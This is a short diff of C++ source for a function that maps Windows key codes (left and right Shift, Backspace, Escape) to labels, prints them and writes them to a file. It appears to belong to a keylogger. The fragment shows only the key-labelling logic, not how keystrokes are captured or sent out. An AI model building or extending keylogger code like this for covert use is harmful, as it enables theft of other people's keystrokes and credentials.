@@ -27,14 +27,24 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile("\n");
 		break;
 
-	case VK_SHIFT:
-		std::cout << " *Shift* ";
-		WriteToFile(" *Shift* ");
+	case VK_LSHIFT:
+		std::cout << " *Left_Shift* ";
+		WriteToFile(" *Left_Shift* ");
+		break;
+
+	case VK_RSHIFT:
+		std::cout << " *Right_Shift* ";
+		WriteToFile(" *Right_Shift* ");
 		break;
 
 	case VK_BACK:
 		std::cout << "\b";
 		WriteToFile("\b");
+		break;
+
+	case VK_ESCAPE:
+		std::cout << "*Esc*";
+		WriteToFile("*Esc*");
 		break;
 
 	case VK_RBUTTON:
